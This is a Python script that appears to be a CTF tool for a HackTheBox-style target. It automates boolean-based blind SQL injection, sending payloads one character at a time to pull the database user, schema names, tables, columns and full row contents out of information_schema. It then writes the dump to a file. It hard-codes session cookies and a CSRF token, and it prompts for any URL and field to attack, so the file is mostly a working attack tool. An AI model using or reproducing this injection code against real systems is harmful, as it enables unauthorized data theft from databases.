#!/usr/bin/python3

import requests
import signal
import sys
import time
from pwn import *


# Classes
class Color:
    PURPLE = "\033[1;35;48m"
    CYAN = "\033[1;36;48m"
    BOLD = "\033[1;37;48m"
    BLUE = "\033[1;34;48m"
    GREEN = "\033[1;32;48m"
    YELLOW = "\033[1;33;48m"
    RED = "\033[1;31;48m"
    BLACK = "\033[1;30;48m"
    UNDERLINE = "\033[4;37;48m"
    END = "\033[1;37;0m"


class DB:
    def __init__(self, name):
        self.name = name
        self.tables = []


class Table:
    def __init__(self, name):
        self.name = name
        self.columns = []
        self.rows = []

    def concat_columns(self):
        return ",'|',".join(self.columns)


# Ctrl + c
def ctrlC(sig, frame):
    print(f"\n\n[{Color.RED}x{Color.END}] Saliendo...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, ctrlC)


# Global Variables
main_url = "http://usage.htb/forget-password"
method = "POST"
headers = {
    "Cookie": "XSRF-TOKEN=eyJpdiI6ImltdzZieEZOejNDT09iRzRjalVPb0E9PSIsInZhbHVlIjoiQjBPMVhESU5rWkVvQ3h2YnczeE9zOE81T1BXRE80NFJBYitPL2doUkI2ZWhZeE0wbE1laG5ZbjNsaWptcjMrSkRkUk1GdmlIR28xTytQUHk3U3VWYXdlKzlscnFvTDAxSDZUVzYwd3NMbmM4UUFlVEorL3NjZ0VqYWRPTHhXWFoiLCJtYWMiOiI5ZmJjM2FmMDA1ZjkxNTI0MGMyMjQ2ODYyNmE5ZjRkNTY0NjBmMTU2MWYzNjg0YmE4MWQ4ZWQ4NDQ1N2YwMzdhIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkJaZVF6T2orbC9QeGwrMDZaNUtIR0E9PSIsInZhbHVlIjoiZG9uaStzdWpodEhJQzZNUkd5bXRuMXBzQm5Jd08vN3dZR21HVnhnWEUwYXpJOHRvR0ZDd1NpWE9HUHNXUVJySjFoejQ1RWJuU2RKR0VIVEk3ZkZ5ZjVGN3o4RXY0NDQ2OEJvZm50UWFzNFp1NlIyc0N6Vys5QVYzRDByVElrR3ciLCJtYWMiOiI1ODNlOTYxYmMxODhjY2NkZjM3ZjkxNDM1M2RiNGNkMzMwYjE3NGYwNzM2NTc2N2IxMTBkMjQ5ZGMzN2RiOGQ5IiwidGFnIjoiIn0%3D"
}
post_data = {
    "_token": "O3kYMir5RxfYAiqIkBy4OqK8VYSHeGjCxV3WgrkG",
    "email": "test@gmail.com",
}
post_data_exploit = "email"
get_data = ""
condition = "We have e-mailed your password reset link to"
dbs = []


# Functions
def getUser(label_menu):
    p2 = log.progress(Color.YELLOW + "User" + Color.END)
    info = ""
    position = 1
    initial_value = post_data[post_data_exploit]

    while True:

        notFindCharacters = True

        for character in range(33, 126):

            payload = f"{initial_value}' and (select ascii(substring(user(),{position},1)))='{character}"
            post_data[post_data_exploit] = payload

            label_menu.status(payload)
            response = requests.post(main_url, headers=headers, data=post_data)

            if condition in response.text:
                info += chr(character)
                p2.status(f"{Color.GREEN}{info}{Color.END}")
                notFindCharacters = False
                break

        position += 1
        if notFindCharacters:
            break


def getDBs(label_menu):
    p2 = log.progress(Color.YELLOW + "DBs" + Color.END)
    info = "information_schema,performance_schema,"
    global dbs
    position = 39
    initial_value = post_data[post_data_exploit]

    while True:

        notFindCharacters = True

        for character in range(33, 126):

            payload = f"{initial_value}' and (select ascii(substring(group_concat(schema_name),{position},1)) from information_schema.schemata)='{character}"
            post_data[post_data_exploit] = payload

            label_menu.status(payload)
            response = requests.post(main_url, headers=headers, data=post_data)

            if condition in response.text:
                info += chr(character)
                p2.status(f"{Color.PURPLE}{info}{Color.END}")
                notFindCharacters = False
                break

        position += 1
        if notFindCharacters:
            break

    new_dbs = info.split(",")
    for db_name in new_dbs:
        db = DB(db_name)
        dbs.append(db)

    print("\n")


def getTables(label_menu):
    global dbs

    for db in dbs:

        info = ""
        p2 = log.progress(
            f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
        )

        position = 1
        while True:

            notFindCharacters = True

            for character in range(33, 126):

                sqli_url = f"{main_url}home' and (select ascii(substring(group_concat(table_name),{position},1)) from information_schema.tables where table_schema='{db.name}')='{character}"
                label_menu.status(sqli_url)
                response = requests.get(sqli_url, headers=headers)

                if "Welcome to the IMF Administration." in response.text:
                    info += chr(character)
                    p2.status(f"{Color.CYAN}{info}{Color.END}")
                    notFindCharacters = False
                    break

            position += 1
            if notFindCharacters:
                break

        new_tables = info.split(",")
        for table_name in new_tables:
            table = Table(table_name)
            db.tables.append(table)

    print("\n")


def getColumns(label_menu):
    global dbs

    for db in dbs:

        for table in db.tables:

            info = ""

            p2 = log.progress(
                f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
            )

            position = 1
            while True:

                notFindCharacters = True

                for character in range(33, 126):
                    sqli_url = f"{main_url}home' and (select ascii(substring(group_concat(column_name),{position},1)) from information_schema.columns where table_schema='{db.name}' and table_name='{table.name}')='{character}"

                    label_menu.status(sqli_url)
                    response = requests.get(sqli_url, headers=headers)

                    if "Welcome to the IMF Administration." in response.text:
                        info += chr(character)
                        p2.status(info)
                        notFindCharacters = False
                        break

                position += 1
                if notFindCharacters:
                    break

            new_columns = info.split(",")
            for column_name in new_columns:
                table.columns.append(column_name)

    print("\n")


def getRows(label_menu):
    global dbs

    for db in dbs:

        for table in db.tables:

            info = ""
            columns = table.concat_columns()

            p2 = log.progress(
                f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
            )

            position = 1
            while True:

                notFindCharacters = True

                for character in range(32, 126):
                    sqli_url = f"{main_url}home' and (select ascii(substring(group_concat({columns}),{position},1)) from {db.name}.{table.name})='{character}"

                    label_menu.status(sqli_url)
                    response = requests.get(sqli_url, headers=headers)

                    if "Welcome to the IMF Administration." in response.text:
                        info += chr(character)
                        p2.status(info)
                        notFindCharacters = False
                        break

                position += 1
                if notFindCharacters:
                    break

            new_rows = info.split(",")
            for row in new_rows:
                table.rows.append(row)

    print("\n")


def buildFile():
    global dbs

    with open("db.txt", "w") as f:
        for db in dbs:
            f.write("DB: " + db.name + "\n")
            for table in db.tables:
                f.write("Table: " + table.name + "\n")
                f.write("Colums: " + table.concat_columns() + "\n")
                f.write("Rows: " + "\n")
                for row in table.rows:
                    f.write(row + "\n")

                f.write("\n\n")
            f.write("\n\n\n")

    print(
        f"\n\n[{Color.YELLOW}!{Color.END}] {Color.BOLD}More details in db.txt{Color.END}\n"
    )


def init_arguments():
    global main_url
    global headers
    global method
    global post_data
    global post_data_exploit
    global get_data
    global condition

    print(
        f"""
{Color.BOLD}#####################################################################################################################################{Color.END}
{Color.BLUE}BBBBB   L      IIIII  N   N  DDDD {Color.END}     {Color.RED} SSS     QQQ    L      IIIII{Color.END}      {Color.BLUE}EEEEE  X   X  TTTTT  RRRR     A    CCCC  TTTTT   OOO   RRRR{Color.END}
{Color.BLUE}B   B   L        I    NN  N  D   D{Color.END}     {Color.RED}S       Q   Q   L        I  {Color.END}      {Color.BLUE}E       X X     T    R   R   A A   C       T    O   O  R   R{Color.END}
{Color.BLUE}BBBBB   L        I    N N N  D   D{Color.END}     {Color.RED} SSS    Q   Q   L        I  {Color.END}      {Color.BLUE}EEEE     X      T    RRRR   AAAAA  C       T    O   O  RRRR{Color.END}
{Color.BLUE}B   B   L        I    N  NN  D   D{Color.END}         {Color.RED}S   Q  QQ   L        I  {Color.END}      {Color.BLUE}E       X X     T    R  R   A   A  C       T    O   O  R  R{Color.END}
{Color.BLUE}BBBBB   LLLLL  IIIII  N   N  DDDD {Color.END}     {Color.RED}SSSS     QQ  Q  LLLLL  IIIII{Color.END}      {Color.BLUE}EEEEE  X   X    T    R   R  A   A  CCCC    T     OOO   R   R{Color.END}
{Color.BOLD}#####################################################################################################################################{Color.END}\n
"""
    )

    label_url = log.progress(f"{Color.BOLD}Url{Color.END}")
    label_method = log.progress(f"{Color.BOLD}Method{Color.END}")
    label_headers = log.progress(f"{Color.BOLD}Headers{Color.END}")
    label_data = log.progress(f"{Color.BOLD}Data{Color.END}")
    label_exploit = log.progress(f"{Color.BOLD}Field to exploit{Color.END}")
    label_condition = log.progress(f"{Color.BOLD}Condition{Color.END}")
    print("\n\n")

    while True:
        input_url = input(f"[{Color.BLUE}?{Color.END}] Request URL with https/http: ")

        if input_url and ("http://" in input_url or "https://" in input_url):
            main_url = input_url
            label_url.status(input_url)
            print("\033[A\033[J", end="")
            break
        else:
            print(f"[{Color.RED}x{Color.END}] Input nor accepted")
            time.sleep(1)
            print("\033[A\033[J" * 2, end="")

    while True:
        input_method = input(f"[{Color.BLUE}?{Color.END}] Request Method, GET/POST: ")

        if input_method and (input_method == "POST" or input_method == "GET"):
            method = input_method
            label_method.status(input_method)
            print("\033[A\033[J", end="")
            break
        else:
            print(f"[{Color.RED}x{Color.END}] Input nor accepted")
            time.sleep(1)
            print("\033[A\033[J" * 2, end="")

    follow_condition = input(
        f"[{Color.BLUE}?{Color.END}] Would you like to add headers to the request? y/n: "
    )
    print("\033[A\033[J", end="")

    if follow_condition == "y":
        while True:
            input_header = input(
                f"[{Color.BLUE}?{Color.END}] Request Headers, use the following format <name>:<value> "
            )

            if input_header:
                name, value = input_header.split(":")
                headers[name] = value
                label_headers.status(headers)
                print("\033[A\033[J", end="")

                follow_condition = input(
                    f"[{Color.BLUE}?{Color.END}] Would you like to add another header? y/n: "
                )
                print("\033[A\033[J", end="")

                if follow_condition == "n":
                    break
            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                print("\033[A\033[J" * 2, end="")
                time.sleep(1)

    while True:
        input_data = input(
            f"[{Color.BLUE}?{Color.END}] Values with which the request is correct, in Post Request use the following format <name>:<value> "
        )

        if input_data:
            if method == "POST":
                name, value = input_data.split(":")
                post_data[name] = value
                label_data.status(post_data)
                print("\033[A\033[J", end="")

                follow_condition = input(
                    f"[{Color.BLUE}?{Color.END}] Would you like to add another value? y/n: "
                )
                print("\033[A\033[J", end="")

                if follow_condition == "n":
                    break

            else:
                get_data = input_data
                label_data.status(get_data)
                print("\033[A\033[J", end="")
                break

        else:
            print(f"[{Color.RED}x{Color.END}] Input nor accepted")
            print("\033[A\033[J" * 2, end="")
            time.sleep(1)

    if method == "POST":
        while True:
            input_exploit = input(
                f"[{Color.BLUE}?{Color.END}] Name of the value that we want to exploit: "
            )

            if input_exploit:
                post_data_exploit = input_exploit
                label_exploit.status(input_exploit)
                print("\033[A\033[J", end="")
                break
            else:
                print(f"[{Color.RED}x{Color.END}] Input nor accepted")
                time.sleep(1)
                print("\033[A\033[J" * 2, end="")

    while True:
        input_condition = input(
            f"[{Color.BLUE}?{Color.END}] Text in the response by which we can detect that the result was correct: "
        )

        if input_condition:
            condition = input_condition
            label_condition.status(input_condition)
            print("\033[A\033[J", end="")
            break
        else:
            print(f"[{Color.RED}x{Color.END}] Input nor accepted")
            time.sleep(1)
            print("\033[A\033[J" * 2, end="")


def main():
    init_arguments()

    label_menu = log.progress(Color.RED + "Brute Force" + Color.END)
    label_menu.status(" Starting ...")
    print("\n")
    time.sleep(1)

    # getUser(label_menu)
    # getDBs(label_menu)
    # getTables(label_menu)
    # getColumns(label_menu)
    # getRows(label_menu)
    # buildFile()


# Main
if __name__ == "__main__":
    main()
